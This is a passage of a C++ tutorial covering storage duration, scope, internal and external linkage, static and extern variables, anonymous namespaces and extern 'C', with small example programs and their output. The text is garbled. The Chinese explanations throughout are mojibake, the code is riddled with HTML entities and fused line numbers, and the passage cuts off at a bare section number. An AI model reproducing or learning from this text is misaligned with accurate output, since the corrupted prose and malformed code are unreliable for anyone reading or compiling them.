ä½¿ç”¨å¤šç§æ–¹æ¡ˆæ¥ç®¡ç†å†…å­˜ä¸­çš„æ•°æ®ã€‚äº†è§£è¿™äº›æ–¹æ¡ˆå¯¹äºç†è§£å˜é‡å’Œå‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸã€å¯è§æ€§ä»¥åŠå®ƒä»¬å¦‚ä½•åœ¨ä¸åŒæ–‡ä»¶é—´å…±äº«è‡³å…³é‡è¦ã€‚ä¸»è¦æ¶‰åŠä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼š å­˜å‚¨æŒç»­æ€§ (Storage Duration): å†³å®šäº†å¯¹è±¡ï¼ˆå˜é‡ï¼‰åœ¨å†…å­˜ä¸­ä¿ç•™å¤šé•¿æ—¶é—´ã€‚ ä½œç”¨åŸŸ (Scope): æè¿°äº†æ ‡è¯†ç¬¦ï¼ˆå˜é‡åã€å‡½æ•°åç­‰ï¼‰åœ¨ç¨‹åºä»£ç ä¸­çš„å¯è§èŒƒå›´ã€‚ é“¾æ¥æ€§ (Linkage): å†³å®šäº†åœ¨ä¸åŒç¼–è¯‘å•å…ƒï¼ˆ.cpp æ–‡ä»¶ï¼‰ä¸­å£°æ˜çš„åŒåæ ‡è¯†ç¬¦æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå®ä½“ã€‚ C++ ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§å­˜å‚¨æŒç»­æ€§ï¼š è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§ (Automatic Storage Duration): å¯¹è±¡åœ¨ç¨‹åºæ‰§è¡Œè¿›å…¥å…¶å®šä¹‰æ‰€åœ¨çš„ä»£ç å—æ—¶åˆ›å»ºï¼Œåœ¨é€€å‡ºè¯¥ä»£ç å—æ—¶é”€æ¯ã€‚é€šå¸¸åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆé staticï¼‰å±äºè¿™ç§ã€‚å†…å­˜é€šå¸¸åœ¨æ ˆ (stack) ä¸Šåˆ†é…ã€‚ é™æ€å­˜å‚¨æŒç»­æ€§ (Static Storage Duration): å¯¹è±¡åœ¨ç¨‹åºå¯åŠ¨æ—¶åˆ›å»ºï¼ˆæˆ–é¦–æ¬¡ä½¿ç”¨å‰ï¼‰ï¼Œåœ¨æ•´ä¸ªç¨‹åºè¿è¡ŒæœŸé—´éƒ½å­˜åœ¨ï¼Œç›´åˆ°ç¨‹åºç»“æŸæ—¶æ‰é”€æ¯ã€‚å…¨å±€å˜é‡ã€æ–‡ä»¶ä½œç”¨åŸŸçš„ static å˜é‡ã€å‡½æ•°å†…éƒ¨çš„ static å˜é‡éƒ½å±äºè¿™ç§ã€‚ çº¿ç¨‹å­˜å‚¨æŒç»­æ€§ (Thread Storage Duration) (C++11): å¯¹è±¡ä¸ç‰¹å®šçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸç»‘å®šã€‚ä½¿ç”¨ thread_local è¯´æ˜ç¬¦å£°æ˜ã€‚ åŠ¨æ€å­˜å‚¨æŒç»­æ€§ (Dynamic Storage Duration): å¯¹è±¡é€šè¿‡ new è¿ç®—ç¬¦åœ¨ç¨‹åºçš„è‡ªç”±å­˜å‚¨åŒºï¼ˆå †, heapï¼‰ä¸Šæ˜¾å¼åˆ›å»ºï¼Œå¹¶é€šè¿‡ delete è¿ç®—ç¬¦æ˜¾å¼é”€æ¯ã€‚å…¶ç”Ÿå‘½å‘¨æœŸç”±ç¨‹åºå‘˜æ§åˆ¶ã€‚ 9.2.1 ä½œç”¨åŸŸå’Œé“¾æ¥ä½œç”¨åŸŸ (Scope) å®šä¹‰äº†æ ‡è¯†ç¬¦æœ‰æ•ˆçš„ä»£ç åŒºåŸŸã€‚C++ ä¸­çš„ä¸»è¦ä½œç”¨åŸŸåŒ…æ‹¬ï¼š å—ä½œç”¨åŸŸ (Block Scope): æ ‡è¯†ç¬¦åœ¨ä»£ç å—ï¼ˆç”± &#123;&#125; åŒ…å›´ï¼‰å†…å¯è§ï¼Œä»å£°æ˜ç‚¹å¼€å§‹åˆ°ä»£ç å—ç»“æŸã€‚å‡½æ•°å†…éƒ¨çš„å˜é‡ã€å¾ªç¯å˜é‡ç­‰å…·æœ‰å—ä½œç”¨åŸŸã€‚ å‡½æ•°ä½œç”¨åŸŸ (Function Scope): ä»…ç”¨äº goto è¯­å¥çš„æ ‡ç­¾ï¼Œæ ‡ç­¾åœ¨æ•´ä¸ªå‡½æ•°å†…éƒ¨éƒ½å¯è§ã€‚ å‡½æ•°åŸå‹ä½œç”¨åŸŸ (Function Prototype Scope): å‡½æ•°åŸå‹å‚æ•°åˆ—è¡¨ä¸­çš„æ ‡è¯†ç¬¦ä»…åœ¨åŸå‹å£°æ˜å†…éƒ¨å¯è§ã€‚ æ–‡ä»¶ä½œç”¨åŸŸ (File Scope) / å…¨å±€ä½œç”¨åŸŸ (Global Scope) / åç§°ç©ºé—´ä½œç”¨åŸŸ (Namespace Scope): åœ¨æ‰€æœ‰å‡½æ•°æˆ–ç±»å¤–éƒ¨å®šä¹‰çš„æ ‡è¯†ç¬¦å…·æœ‰æ–‡ä»¶ä½œç”¨åŸŸï¼ˆæˆ–æ›´å‡†ç¡®åœ°è¯´æ˜¯åç§°ç©ºé—´ä½œç”¨åŸŸï¼Œå…¨å±€ä½œç”¨åŸŸæ˜¯é»˜è®¤çš„å…¨å±€åç§°ç©ºé—´ï¼‰ã€‚å®ƒä»¬ä»å£°æ˜ç‚¹å¼€å§‹åˆ°æ–‡ä»¶æœ«å°¾éƒ½å¯è§ã€‚ ç±»ä½œç”¨åŸŸ (Class Scope): ç±»æˆå‘˜ï¼ˆæ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°ï¼‰å…·æœ‰ç±»ä½œç”¨åŸŸï¼Œåœ¨ç±»å®šä¹‰å†…éƒ¨ä»¥åŠé€šè¿‡å¯¹è±¡ã€å¼•ç”¨æˆ–æŒ‡é’ˆè®¿é—®æ—¶å¯è§ã€‚ é“¾æ¥æ€§ (Linkage) æè¿°äº†åç§°å¦‚ä½•åœ¨ä¸åŒçš„ç¼–è¯‘å•å…ƒï¼ˆ.cpp æ–‡ä»¶ï¼‰ä¹‹é—´å…±äº«ã€‚ æ— é“¾æ¥æ€§ (No Linkage): åç§°åªåœ¨å®šä¹‰å®ƒçš„ä½œç”¨åŸŸå†…æœ‰æ•ˆï¼Œä¸èƒ½è¢«å…¶ä»–ä½œç”¨åŸŸæˆ–ç¼–è¯‘å•å…ƒè®¿é—®ã€‚å…·æœ‰å—ä½œç”¨åŸŸçš„å˜é‡ï¼ˆåŒ…æ‹¬å‡½æ•°å†…éƒ¨çš„ static å˜é‡ï¼‰é€šå¸¸æ²¡æœ‰é“¾æ¥æ€§ã€‚ å†…éƒ¨é“¾æ¥æ€§ (Internal Linkage): åç§°å¯ä»¥åœ¨å®šä¹‰å®ƒçš„å•ä¸ªç¼–è¯‘å•å…ƒå†…çš„æ‰€æœ‰ä½œç”¨åŸŸä¸­å…±äº«ï¼Œä½†ä¸èƒ½è¢«å…¶ä»–ç¼–è¯‘å•å…ƒè®¿é—®ã€‚åœ¨æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€æˆ–å‘½åç©ºé—´ï¼‰ä½¿ç”¨ static å…³é”®å­—å£°æ˜çš„å˜é‡å’Œå‡½æ•°ï¼Œä»¥åŠåŒ¿åå‘½åç©ºé—´ä¸­çš„å®ä½“å…·æœ‰å†…éƒ¨é“¾æ¥æ€§ã€‚ å¤–éƒ¨é“¾æ¥æ€§ (External Linkage): åç§°å¯ä»¥åœ¨å¤šä¸ªç¼–è¯‘å•å…ƒä¹‹é—´å…±äº«ã€‚åœ¨æ–‡ä»¶ä½œç”¨åŸŸï¼ˆå…¨å±€æˆ–å‘½åç©ºé—´ï¼‰å£°æ˜çš„é static å‡½æ•°ã€é static é const å…¨å±€å˜é‡ã€extern const å…¨å±€å˜é‡ä»¥åŠç±»ç­‰å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ã€‚ 9.2.2 è‡ªåŠ¨å­˜å‚¨æŒç»­æ€§è¿™æ˜¯æœ€å¸¸è§çš„å­˜å‚¨æ–¹å¼ï¼Œé€‚ç”¨äºå‡½æ•°å†…éƒ¨å®šä¹‰çš„å±€éƒ¨å˜é‡ï¼ˆæœªä½¿ç”¨ staticã€extern æˆ– thread_localï¼‰ã€‚ å­˜å‚¨æŒç»­æ€§: è‡ªåŠ¨ã€‚è¿›å…¥ä»£ç å—æ—¶åˆ›å»ºï¼Œé€€å‡ºæ—¶é”€æ¯ã€‚ ä½œç”¨åŸŸ: å—ä½œç”¨åŸŸã€‚ é“¾æ¥æ€§: æ— é“¾æ¥æ€§ã€‚ 123456789101112131415161718192021#include &lt;iostream&gt;void my_func() &#123; int auto_var = 10; // è‡ªåŠ¨å˜é‡ std::cout &lt;&lt; &quot;Inside my_func: auto_var = &quot; &lt;&lt; auto_var &lt;&lt; std::endl; auto_var++; // ä¿®æ”¹åªåœ¨æœ¬æ¬¡è°ƒç”¨æœ‰æ•ˆ&#125; // auto_var åœ¨è¿™é‡Œè¢«é”€æ¯int main() &#123; int main_var = 5; // main å‡½æ•°çš„è‡ªåŠ¨å˜é‡ if (main_var &gt; 0) &#123; double block_var = 3.14; // å—ä½œç”¨åŸŸçš„è‡ªåŠ¨å˜é‡ std::cout &lt;&lt; &quot;Inside if block: block_var = &quot; &lt;&lt; block_var &lt;&lt; std::endl; &#125; // block_var åœ¨è¿™é‡Œè¢«é”€æ¯ // std::cout &lt;&lt; block_var; // é”™è¯¯ï¼block_var åœ¨æ­¤ä½œç”¨åŸŸä¸å¯è§ my_func(); // è°ƒç”¨ my_funcï¼Œåˆ›å»ºå¹¶é”€æ¯å…¶ auto_var my_func(); // å†æ¬¡è°ƒç”¨ï¼Œåˆ›å»ºæ–°çš„ auto_varï¼Œå…¶å€¼ä»æ˜¯ 10 return 0;&#125; 9.2.3 é™æ€æŒç»­å˜é‡é™æ€æŒç»­å˜é‡åœ¨ç¨‹åºæ•´ä¸ªè¿è¡ŒæœŸé—´éƒ½å­˜åœ¨ã€‚æ ¹æ®é“¾æ¥æ€§ä¸åŒï¼Œå®ƒä»¬æœ‰ä¸åŒçš„ç”¨é€”å’Œå¯è§æ€§ã€‚ 9.2.4 é™æ€æŒç»­æ€§ã€å¤–éƒ¨é“¾æ¥æ€§è¿™äº›å˜é‡ï¼ˆæœ‰æ—¶ç§°ä¸ºå…¨å±€å˜é‡ï¼‰å¯ä»¥åœ¨ç¨‹åºçš„å¤šä¸ªæ–‡ä»¶ä¸­å…±äº«ã€‚ å®šä¹‰: åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰ï¼Œä¸”æœªä½¿ç”¨ static å…³é”®å­—ã€‚ å­˜å‚¨æŒç»­æ€§: é™æ€ã€‚ ä½œç”¨åŸŸ: æ–‡ä»¶ä½œç”¨åŸŸï¼ˆä»å®šä¹‰ç‚¹åˆ°æ–‡ä»¶å°¾ï¼‰ã€‚ é“¾æ¥æ€§: å¤–éƒ¨é“¾æ¥æ€§ã€‚ åˆå§‹åŒ–: å¦‚æœæœªæ˜¾å¼åˆå§‹åŒ–ï¼Œä¼šè¢«è‡ªåŠ¨åˆå§‹åŒ–ä¸ºé›¶ï¼ˆæˆ–å¯¹åº”ç±»å‹çš„é›¶å€¼ï¼‰ã€‚ å…±äº«: è¦åœ¨å…¶ä»–æ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œéœ€è¦ä½¿ç”¨ extern å…³é”®å­—è¿›è¡Œå£°æ˜ï¼ˆä¸æ˜¯å®šä¹‰ï¼‰ã€‚ ç¤ºä¾‹: 1234567891011121314// file1.cpp#include &lt;iostream&gt;// å®šä¹‰å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡double global_data = 3.14; // æ˜¾å¼åˆå§‹åŒ–int count; // éšå¼åˆå§‹åŒ–ä¸º 0void increment_count() &#123; count++;&#125;void display_data() &#123; std::cout &lt;&lt; &quot;In file1: global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125; 1234567891011121314151617181920212223// file2.cpp#include &lt;iostream&gt;// å£°æ˜ file1 ä¸­å®šä¹‰çš„å…¨å±€å˜é‡ (ä½¿ç”¨ extern)extern double global_data;extern int count;// å£°æ˜ file1 ä¸­å®šä¹‰çš„å‡½æ•° (å‡½æ•°å£°æ˜é»˜è®¤ extern)void increment_count();void display_data();void use_globals() &#123; std::cout &lt;&lt; &quot;In file2 (before increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl; increment_count(); // è°ƒç”¨ file1 ä¸­çš„å‡½æ•°ï¼Œä¿®æ”¹ file1 ä¸­çš„ count std::cout &lt;&lt; &quot;In file2 (after increment): global_data = &quot; &lt;&lt; global_data &lt;&lt; &quot;, count = &quot; &lt;&lt; count &lt;&lt; std::endl;&#125;int main() &#123; display_data(); // è°ƒç”¨ file1 çš„å‡½æ•° use_globals(); // è°ƒç”¨ file2 çš„å‡½æ•° display_data(); // å†æ¬¡è°ƒç”¨ file1 çš„å‡½æ•°ï¼ŒæŸ¥çœ‹ count çš„å˜åŒ– return 0;&#125; ç¼–è¯‘å’Œé“¾æ¥: 12g++ file1.cpp file2.cpp -o myprogram./myprogram è¾“å‡º: 1234In file1: global_data &#x3D; 3.14, count &#x3D; 0In file2 (before increment): global_data &#x3D; 3.14, count &#x3D; 0In file2 (after increment): global_data &#x3D; 3.14, count &#x3D; 1In file1: global_data &#x3D; 3.14, count &#x3D; 1 æ³¨æ„: è¿‡åº¦ä½¿ç”¨å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§çš„å…¨å±€å˜é‡ä¼šå¢åŠ æ¨¡å—é—´çš„è€¦åˆåº¦ï¼Œä½¿ç¨‹åºéš¾ä»¥ç†è§£å’Œç»´æŠ¤ï¼Œåº”å°½é‡é¿å…ã€‚ 9.2.5 é™æ€æŒç»­æ€§ã€å†…éƒ¨é“¾æ¥æ€§è¿™äº›å˜é‡å’Œå‡½æ•°çš„ä½œç”¨åŸŸé™åˆ¶åœ¨å•ä¸ªç¼–è¯‘å•å…ƒï¼ˆ.cpp æ–‡ä»¶ï¼‰å†…ï¼Œæœ‰åŠ©äºé¿å…ä¸åŒæ–‡ä»¶é—´çš„å‘½åå†²çªã€‚ å®šä¹‰: åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰ï¼Œå¹¶ä½¿ç”¨ static å…³é”®å­—ã€‚æˆ–è€…å®šä¹‰åœ¨åŒ¿åå‘½åç©ºé—´ä¸­ã€‚ å­˜å‚¨æŒç»­æ€§: é™æ€ã€‚ ä½œç”¨åŸŸ: æ–‡ä»¶ä½œç”¨åŸŸã€‚ é“¾æ¥æ€§: å†…éƒ¨é“¾æ¥æ€§ã€‚ åˆå§‹åŒ–: åŒå¤–éƒ¨é“¾æ¥æ€§å˜é‡ï¼Œé»˜è®¤ä¸ºé›¶å€¼ã€‚ å…±äº«: ä¸èƒ½è¢«å…¶ä»–ç¼–è¯‘å•å…ƒé€šè¿‡ extern è®¿é—®ã€‚ ç¤ºä¾‹: 12345678910111213141516// service.cpp#include &lt;iostream&gt;// å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„é™æ€å…¨å±€å˜é‡static int service_counter = 0; // åªåœ¨ service.cpp å¯è§// å…·æœ‰å†…éƒ¨é“¾æ¥æ€§çš„é™æ€å‡½æ•°static void internal_helper() &#123; std::cout &lt;&lt; &quot;Internal helper called.&quot; &lt;&lt; std::endl;&#125;void provide_service() &#123; internal_helper(); service_counter++; std::cout &lt;&lt; &quot;Service provided. Counter: &quot; &lt;&lt; service_counter &lt;&lt; std::endl;&#125; 123456789101112131415// main.cpp#include &lt;iostream&gt;// å£°æ˜ service.cpp ä¸­çš„å‡½æ•° (å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§)void provide_service();// extern int service_counter; // é”™è¯¯ï¼æ— æ³•è®¿é—®å†…éƒ¨é“¾æ¥æ€§çš„å˜é‡// static void internal_helper(); // é”™è¯¯ï¼æ— æ³•è®¿é—®å†…éƒ¨é“¾æ¥æ€§çš„å‡½æ•°int main() &#123; provide_service(); provide_service(); // std::cout &lt;&lt; service_counter; // é”™è¯¯ï¼ return 0;&#125; ç¼–è¯‘å’Œé“¾æ¥: 12g++ service.cpp main.cpp -o myapp./myapp è¾“å‡º: 1234Internal helper called.Service provided. Counter: 1Internal helper called.Service provided. Counter: 2 åŒ¿åå‘½åç©ºé—´ (Unnamed/Anonymous Namespace): C++ æä¾›åŒ¿åå‘½åç©ºé—´ä½œä¸º static ç”¨äºå†…éƒ¨é“¾æ¥æ€§çš„æ›´å¥½æ›¿ä»£æ–¹æ¡ˆã€‚åœ¨åŒ¿åå‘½åç©ºé—´ä¸­å£°æ˜çš„æ‰€æœ‰å†…å®¹éƒ½å…·æœ‰å†…éƒ¨é“¾æ¥æ€§ã€‚ 123456789101112131415// service_v2.cpp#include &lt;iostream&gt;namespace &#123; // åŒ¿åå‘½åç©ºé—´ int service_counter_v2 = 0; // å†…éƒ¨é“¾æ¥æ€§ void internal_helper_v2() &#123; // å†…éƒ¨é“¾æ¥æ€§ std::cout &lt;&lt; &quot;Internal helper v2 called.&quot; &lt;&lt; std::endl; &#125;&#125; // end anonymous namespacevoid provide_service_v2() &#123; internal_helper_v2(); service_counter_v2++; std::cout &lt;&lt; &quot;Service v2 provided. Counter: &quot; &lt;&lt; service_counter_v2 &lt;&lt; std::endl;&#125; 9.2.6 é™æ€å­˜å‚¨æŒç»­æ€§ã€æ— é“¾æ¥æ€§è¿™ç§å˜é‡åœ¨å‡½æ•°å†…éƒ¨å£°æ˜ï¼Œä½†ä½¿ç”¨ static å…³é”®å­—ã€‚ å®šä¹‰: åœ¨ä»£ç å—ï¼ˆé€šå¸¸æ˜¯å‡½æ•°ï¼‰å†…éƒ¨ï¼Œä½¿ç”¨ static å…³é”®å­—ã€‚ å­˜å‚¨æŒç»­æ€§: é™æ€ã€‚å®ƒä»¬åœ¨ç¨‹åºå¯åŠ¨æ—¶æˆ–ç¬¬ä¸€æ¬¡æ‰§è¡Œåˆ°å…¶å®šä¹‰æ—¶åˆ›å»ºï¼Œå¹¶åœ¨æ•´ä¸ªç¨‹åºç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ã€‚ ä½œç”¨åŸŸ: å—ä½œç”¨åŸŸã€‚å®ƒä»¬åªèƒ½åœ¨å®šä¹‰å®ƒä»¬çš„ä»£ç å—å†…éƒ¨æŒ‰åç§°è®¿é—®ã€‚ é“¾æ¥æ€§: æ— é“¾æ¥æ€§ã€‚ åˆå§‹åŒ–: åªåœ¨ç¨‹åºæ‰§è¡Œç¬¬ä¸€æ¬¡åˆ°è¾¾å…¶å®šä¹‰æ—¶åˆå§‹åŒ–ä¸€æ¬¡ã€‚å¦‚æœæœªæ˜¾å¼åˆå§‹åŒ–ï¼Œé»˜è®¤ä¸ºé›¶å€¼ã€‚ ç‰¹æ€§: å®ƒä»¬åœ¨å‡½æ•°è°ƒç”¨ä¹‹é—´ä¿æŒå…¶å€¼ã€‚ ç¤ºä¾‹: 123456789101112131415#include &lt;iostream&gt;void record_call() &#123; static int call_count = 0; // é™æ€å±€éƒ¨å˜é‡ï¼Œåªåˆå§‹åŒ–ä¸€æ¬¡ call_count++; std::cout &lt;&lt; &quot;Function record_call has been called &quot; &lt;&lt; call_count &lt;&lt; &quot; times.&quot; &lt;&lt; std::endl;&#125;int main() &#123; record_call(); record_call(); record_call(); // std::cout &lt;&lt; call_count; // é”™è¯¯ï¼call_count åœ¨ main ä¸­ä¸å¯è§ return 0;&#125; è¾“å‡º: 123Function record_call has been called 1 times.Function record_call has been called 2 times.Function record_call has been called 3 times. 9.2.7 è¯´æ˜ç¬¦å’Œé™å®šç¬¦C++ æä¾›äº†ä¸€äº›å…³é”®å­—æ¥ä¿®æ”¹å˜é‡æˆ–å‡½æ•°çš„å­˜å‚¨æŒç»­æ€§ã€é“¾æ¥æ€§æˆ–è¡Œä¸ºï¼š static: ç”¨äºæ–‡ä»¶ä½œç”¨åŸŸï¼šæŒ‡å®šå†…éƒ¨é“¾æ¥æ€§ã€‚ ç”¨äºå—ä½œç”¨åŸŸï¼šæŒ‡å®šé™æ€å­˜å‚¨æŒç»­æ€§ï¼ˆå’Œæ— é“¾æ¥æ€§ï¼‰ã€‚ ç”¨äºç±»æˆå‘˜ï¼šè¡¨ç¤ºæˆå‘˜å±äºç±»æœ¬èº«ï¼Œè€Œä¸æ˜¯ç±»çš„ç‰¹å®šå¯¹è±¡ï¼ˆå°†åœ¨ç±»ç« èŠ‚è¯¦ç»†ä»‹ç»ï¼‰ã€‚ extern: ç”¨äºå˜é‡ï¼šå£°æ˜ä¸€ä¸ªåœ¨åˆ«å¤„ï¼ˆé€šå¸¸æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶ï¼‰å®šä¹‰çš„å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§çš„å˜é‡ã€‚å®ƒä¸åˆ›å»ºå˜é‡ï¼Œåªæ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡å­˜åœ¨ã€‚ extern &quot;C&quot;: æŒ‡å®šè¯­è¨€é“¾æ¥æ€§ï¼ˆè§ 9.2.9ï¼‰ã€‚ const: é™å®šç¬¦ï¼Œè¡¨ç¤ºå˜é‡çš„å€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚ const å…¨å±€å˜é‡é»˜è®¤å…·æœ‰å†…éƒ¨é“¾æ¥æ€§ã€‚è¦ä½¿å…¶å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ï¼Œå¿…é¡»ä½¿ç”¨ extern const å£°æ˜ï¼Œå¹¶åœ¨å®šä¹‰æ—¶ä¹ŸåŠ ä¸Š externã€‚ 123456789// header.hextern const int MAX_USERS; // å£°æ˜å¤–éƒ¨é“¾æ¥çš„ const// config.cppextern const int MAX_USERS = 100; // å®šä¹‰å¤–éƒ¨é“¾æ¥çš„ const// utils.cpp#include &quot;header.h&quot;void check_users() &#123; if (user_count &gt; MAX_USERS) &#123; /*...*/ &#125; &#125; æˆ–è€…ï¼Œæ›´å¸¸è§çš„åšæ³•æ˜¯å°† const å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­ï¼ˆå› ä¸ºå®ƒé»˜è®¤å†…éƒ¨é“¾æ¥ï¼Œä¸ä¼šå¼•èµ·é‡å®šä¹‰é—®é¢˜ï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ C++11 çš„ constexprã€‚ thread_local (C++11): æŒ‡å®šçº¿ç¨‹å­˜å‚¨æŒç»­æ€§ã€‚æ¯ä¸ªçº¿ç¨‹å°†æ‹¥æœ‰è¯¥å˜é‡çš„ç‹¬ç«‹å‰¯æœ¬ã€‚ volatile: é™å®šç¬¦ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å˜é‡çš„å€¼å¯èƒ½åœ¨ç¨‹åºä»£ç æœªæ˜¾å¼ä¿®æ”¹çš„æƒ…å†µä¸‹å‘ç”Ÿæ”¹å˜ï¼ˆä¾‹å¦‚ï¼Œç”±ç¡¬ä»¶æˆ–å…¶ä»–å¹¶å‘çº¿ç¨‹ä¿®æ”¹ï¼‰ã€‚ç¼–è¯‘å™¨ä¸ä¼šå¯¹ volatile å˜é‡è¿›è¡ŒæŸäº›ä¼˜åŒ–ï¼ˆå¦‚ç¼“å­˜åˆ°å¯„å­˜å™¨ï¼‰ã€‚ mutable: é™å®šç¬¦ï¼Œä»…ç”¨äºç±»çš„æ•°æ®æˆå‘˜ã€‚å…è®¸åœ¨ const æˆå‘˜å‡½æ•°ä¸­ä¿®æ”¹è¢« mutable ä¿®é¥°çš„æˆå‘˜å˜é‡ã€‚ 9.2.8 å‡½æ•°å’Œé“¾æ¥æ€§å‡½æ•°é»˜è®¤å…·æœ‰å¤–éƒ¨é“¾æ¥æ€§ï¼Œè¿™æ„å‘³ç€åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°å¯ä»¥åœ¨å…¶ä»–æ–‡ä»¶ä¸­å£°æ˜å’Œè°ƒç”¨ã€‚ 1234567// math_utils.cppdouble square(double x) &#123; return x * x; &#125; // å¤–éƒ¨é“¾æ¥æ€§ (é»˜è®¤)// main.cpp#include &lt;iostream&gt;double square(double x); // å£°æ˜ (é»˜è®¤ extern)int main() &#123; std::cout &lt;&lt; square(5.0) &lt;&lt; std::endl; return 0; &#125; å¯ä»¥ä½¿ç”¨ static å…³é”®å­—å°†å‡½æ•°çš„é“¾æ¥æ€§æ”¹ä¸ºå†…éƒ¨é“¾æ¥æ€§ï¼Œä½¿å…¶ä»…åœ¨å®šä¹‰çš„ .cpp æ–‡ä»¶å†…å¯è§ã€‚ 1234567891011// helper.cpp#include &lt;iostream&gt;static void internal_print(const char* msg) &#123; // å†…éƒ¨é“¾æ¥æ€§ std::cout &lt;&lt; &quot;[Internal] &quot; &lt;&lt; msg &lt;&lt; std::endl;&#125;void public_helper() &#123; internal_print(&quot;Public helper called&quot;); &#125;// main.cppvoid public_helper();// static void internal_print(const char*); // é”™è¯¯ï¼æ— æ³•è®¿é—®int main() &#123; public_helper(); return 0; &#125; 9.2.9 è¯­è¨€é“¾æ¥æ€§C++ ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ç”¨å…¶ä»–è¯­è¨€ï¼ˆä¸»è¦æ˜¯ C è¯­è¨€ï¼‰ç¼–å†™çš„å‡½æ•°ã€‚ç”±äº C++ æ”¯æŒå‡½æ•°é‡è½½ï¼ˆé€šè¿‡åç§°ä¿®é¥°ï¼‰ï¼Œè€Œ C è¯­è¨€ä¸æ”¯æŒï¼Œç›´æ¥é“¾æ¥å¯èƒ½ä¼šå¤±è´¥ã€‚è¯­è¨€é“¾æ¥æ€§ (Language Linkage) æœºåˆ¶å…è®¸æŒ‡å®šå‡½æ•°åº”éµå¾ªå“ªç§è¯­è¨€çš„é“¾æ¥çº¦å®šã€‚ æœ€å¸¸ç”¨çš„æ˜¯ extern &quot;C&quot;ï¼Œå®ƒæŒ‡ç¤ºç¼–è¯‘å™¨ä½¿ç”¨ C è¯­è¨€çš„é“¾æ¥çº¦å®šï¼ˆé€šå¸¸åªæ˜¯å‡½æ•°åæœ¬èº«ï¼Œæ²¡æœ‰ä¿®é¥°ï¼‰ã€‚ ç”¨æ³•: å•ä¸ªå‡½æ•°: 1extern &quot;C&quot; void c_style_function(int); å¤šä¸ªå‡½æ•°å—: 12345extern &quot;C&quot; &#123; #include &lt;stdio.h&gt; // åŒ…å« C å¤´æ–‡ä»¶ int c_function1(double); void c_function2(const char*);&#125; å½“åœ¨ C++ ä»£ç ä¸­åŒ…å« C è¯­è¨€çš„å¤´æ–‡ä»¶æ—¶ï¼Œè¿™äº›å¤´æ–‡ä»¶é€šå¸¸å·²ç»ä½¿ç”¨äº† extern &quot;C&quot;ï¼ˆé€šè¿‡æ¡ä»¶ç¼–è¯‘ __cplusplus å®ï¼‰æ¥ç¡®ä¿ C++ ç¼–è¯‘å™¨èƒ½æ­£ç¡®é“¾æ¥å…¶ä¸­çš„å‡½æ•°ã€‚ 1234567891011// C å¤´æ–‡ä»¶ my_c_lib.h å¯èƒ½åŒ…å«ç±»ä¼¼ç»“æ„#ifdef __cplusplusextern &quot;C&quot; &#123;#endifvoid c_api_call(int);// ... å…¶ä»– C å‡½æ•°å£°æ˜ ...#ifdef __cplusplus&#125; // extern &quot;C&quot;#endif 9.2.10 å­˜å‚¨æ–¹æ¡ˆå’ŒåŠ¨æ€åˆ†é…æ€»ç»“ä¸€ä¸‹ä¸»è¦çš„å­˜å‚¨æ–¹æ¡ˆï¼š è‡ªåŠ¨å­˜å‚¨: æ ˆå†…å­˜ï¼Œç”Ÿå‘½å‘¨æœŸä¸ä»£ç å—ç»‘å®šï¼Œè‡ªåŠ¨ç®¡ç†ã€‚ é™æ€å­˜å‚¨: ç¨‹åºç”Ÿå‘½å‘¨æœŸå†…å­˜åœ¨ï¼Œæ ¹æ®é“¾æ¥æ€§ï¼ˆå¤–éƒ¨ã€å†…éƒ¨ã€æ— ï¼‰å†³å®šå¯è§æ€§ã€‚ çº¿ç¨‹å­˜å‚¨: ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç»‘å®šã€‚ åŠ¨æ€å­˜å‚¨: å †å†…å­˜ï¼ˆè‡ªç”±å­˜å‚¨åŒºï¼‰ï¼Œç”Ÿå‘½å‘¨æœŸç”± new å’Œ delete æ‰‹åŠ¨ç®¡ç†ã€‚ åŠ¨æ€åˆ†é… (new/delete) æä¾›äº†æœ€å¤§çš„çµæ´»æ€§ï¼Œå…è®¸åœ¨è¿è¡Œæ—¶æ ¹æ®éœ€è¦åˆ›å»ºå’Œé”€æ¯å¯¹è±¡ï¼Œä½†åŒæ—¶ä¹Ÿå¸¦æ¥äº†æ‰‹åŠ¨ç®¡ç†å†…å­˜çš„è´£ä»»ï¼Œå®¹æ˜“å‡ºé”™ï¼ˆå¦‚å†…å­˜æ³„æ¼ã€æ‚¬æŒ‚æŒ‡é’ˆï¼‰ã€‚åç»­ç« èŠ‚å°†æ›´è¯¦ç»†åœ°æ¢è®¨åŠ¨æ€å†…å­˜ç®¡ç†ï¼Œç‰¹åˆ«æ˜¯ä¸ç±»ç»“åˆä½¿ç”¨æ—¶ã€‚ 9.3 